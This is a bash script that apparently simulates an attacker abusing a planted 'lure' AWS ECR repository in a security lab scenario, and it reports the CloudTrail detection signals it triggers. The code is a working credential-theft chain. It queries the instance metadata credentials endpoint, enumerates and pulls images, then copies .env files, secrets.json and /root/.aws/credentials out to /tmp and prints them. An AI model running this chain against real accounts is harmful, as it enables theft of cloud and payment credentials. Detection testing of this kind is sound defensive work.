#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 5 (ECR Container Image Lure)
#
# This script can be run:
#   A) From inside the scenario-4 bastion (uses instance profile)
#   B) Standalone with any AWS credentials that have ECR access
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

REGION="${AWS_DEFAULT_REGION:-us-west-2}"

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 5 — ABUSE CHAIN"
echo "  ECR Container Image Lure"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Checking for instance profile (scenario-4 bastion path)"
# ---------------------------------------------------------------
# Try instance metadata — if we're on the bastion, this will work
IMDS_ROLE=$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo "")

if [ -n "${IMDS_ROLE}" ]; then
  info "Instance profile detected: ${IMDS_ROLE}"
  info "Running from scenario-4 bastion — using instance profile credentials"
else
  info "Not on EC2 instance — using existing AWS credentials"
fi

# ---------------------------------------------------------------
step "2" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

ECR_REGISTRY="${ACCOUNT_ID}.dkr.ecr.${REGION}.amazonaws.com"
REPO_NAME="prod-payment-service"

# ---------------------------------------------------------------
step "3" "Discovering ECR repositories (ecr:DescribeRepositories)"
# ---------------------------------------------------------------
attack "ecr:DescribeRepositories"
aws ecr describe-repositories \
  --region "${REGION}" \
  --query "repositories[*].[repositoryName,repositoryUri]" \
  --output table
info "Target repo: ${REPO_NAME}"

# ---------------------------------------------------------------
step "4" "Listing images in lure repo (ecr:ListImages)"
# ---------------------------------------------------------------
attack "ecr:ListImages → ${REPO_NAME}"
aws ecr list-images \
  --region "${REGION}" \
  --repository-name "${REPO_NAME}" \
  --query "imageIds[*].[imageTag]" \
  --output table

# ---------------------------------------------------------------
step "5" "Authenticating to ECR (ecr:GetAuthorizationToken)"
# ---------------------------------------------------------------
attack "ecr:GetAuthorizationToken"
aws ecr get-login-password --region "${REGION}" \
  | docker login --username AWS --password-stdin "${ECR_REGISTRY}"
info "Docker authenticated to ECR"

# ---------------------------------------------------------------
step "6" "Pulling lure image (ecr:BatchGetImage + GetDownloadUrlForLayer)"
# ---------------------------------------------------------------
IMAGE_URI="${ECR_REGISTRY}/${REPO_NAME}:latest"
attack "docker pull → ${IMAGE_URI}"
docker pull "${IMAGE_URI}"
info "Image pulled successfully"

# ---------------------------------------------------------------
step "7" "Extracting secrets from image layers"
# ---------------------------------------------------------------
info "Creating temporary container to extract files..."
CONTAINER_ID=$(docker create "${IMAGE_URI}")

echo ""
echo -e "${YELLOW}--- /app/.env (Database, Stripe, Redis credentials) ---${NC}"
docker cp "${CONTAINER_ID}:/app/.env" /tmp/extracted-env 2>/dev/null && cat /tmp/extracted-env || warn "File not found"

echo ""
echo -e "${YELLOW}--- /app/config/secrets.json (PII, payment tokens, endpoints) ---${NC}"
docker cp "${CONTAINER_ID}:/app/config/secrets.json" /tmp/extracted-secrets.json 2>/dev/null && jq . /tmp/extracted-secrets.json || warn "File not found"

echo ""
echo -e "${YELLOW}--- /root/.aws/credentials (AWS session token) ---${NC}"
docker cp "${CONTAINER_ID}:/root/.aws/credentials" /tmp/extracted-aws-creds 2>/dev/null && cat /tmp/extracted-aws-creds || warn "File not found"

# ---------------------------------------------------------------
step "8" "Cleaning up Docker artifacts"
# ---------------------------------------------------------------
docker rm "${CONTAINER_ID}" > /dev/null
info "Temporary container removed"

# Optionally remove the pulled image
# docker rmi "${IMAGE_URI}" > /dev/null 2>&1

# ---------------------------------------------------------------
# Summary
# ---------------------------------------------------------------
echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: GetAuthorizationToken on ECR"
echo "  • CloudTrail: DescribeRepositories"
echo "  • CloudTrail: ListImages on ${REPO_NAME}"
echo "  • CloudTrail: BatchGetImage + GetDownloadUrlForLayer (image pull)"
if [ -n "${IMDS_ROLE}" ]; then
echo "  • (From scenario-4): SG modification + instance start + SSH"
fi
echo ""
echo -e "${CYAN}Extracted files saved to:${NC}"
echo "  /tmp/extracted-env"
echo "  /tmp/extracted-secrets.json"
echo "  /tmp/extracted-aws-creds"
echo ""
